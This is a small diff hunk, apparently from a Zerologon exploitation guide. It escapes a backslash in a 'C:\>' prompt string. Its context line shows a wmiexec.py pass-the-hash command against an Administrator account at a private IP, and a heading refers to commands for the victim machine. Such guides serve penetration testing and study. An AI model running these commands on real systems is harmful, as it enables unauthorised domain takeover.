@@ -75,7 +75,7 @@ wmiexec.py ZEROLOGON/Administrator@192.168.1.28 -hashes aad3b435b51404eeaad3b435
 
 Looking for:
 
-C:\>
+C:\\>
 
 
 ## Commands to run once on victim machine:
